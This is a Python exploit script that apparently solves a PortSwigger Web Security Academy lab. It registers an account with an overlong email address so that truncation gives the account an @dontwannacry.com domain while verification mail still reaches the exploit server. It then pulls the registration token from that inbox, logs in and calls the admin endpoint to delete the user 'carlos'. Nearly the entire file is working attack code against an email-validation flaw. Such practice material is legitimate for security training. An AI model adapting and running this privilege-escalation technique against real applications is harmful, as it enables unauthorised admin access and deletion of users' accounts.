import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# first i need to find email client address always need to change this  email client url 
email_client_url = "https://exploit-0a7b0080035d12e580d84dea011500e3.exploit-server.net/"

csrf_token = session.get(app_url+"/register",verify=False,proxies=proxies)
token = re.search(r'name="csrf" value="(.*?)"',csrf_token.text).group(1)
print(f"csrf token of register user is",token)


#for i in range(0, 256):
pemail = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0a7b0080035d12e580d84dea011500e3.exploit-server.net"



data = {"username":"test4","password":"test4","csrf":token,"email":pemail}
register = session.post(app_url+"/register",verify=False,proxies=proxies,data=data)

# now we need to verfiy the email first from the email client 
email_verify = session.get(email_client_url+"/email",verify=False,proxies=proxies)
# <a href='https://0ab300cf040bbada85f7fd0b00e50067.web-security-academy.net/register?temp-registration-token=oKY1TGmwROLjF2U5mBrt60wdGMzO1Kp1' target=_blank>https://0ab300cf040bbada85f7fd0b00e50067.web-security-academy.net/register?temp-registration-token=oKY1TGmwROLjF2U5mBrt60wdGMzO1Kp1</a>
email_find_verify = re.findall(r'temp-registration-token=(.+)\' target=_blank>',email_verify.text)  # 90% this will work
print(email_find_verify)
if email_find_verify:
    first_token = email_find_verify[0]
    print(first_token)
else:
    print("No token found.")


# So we are going to verify the token 
    
account_verfication = session.get(f"{app_url}/register?temp-registration-token={first_token}", verify=False,proxies=proxies)
if "Account registration successful" in account_verfication.text:
    print("account register successful")

# login to account

data = {"username":"test4","password":"test4","csrf":token}
test_user = session.post(app_url+"/login",data=data,verify=False,proxies=proxies)
cookies = session.cookies.get_dict()
print(cookies)



delete_carlos = session.get(app_url+"/admin/delete?username=carlos",verify=False,proxies=proxies)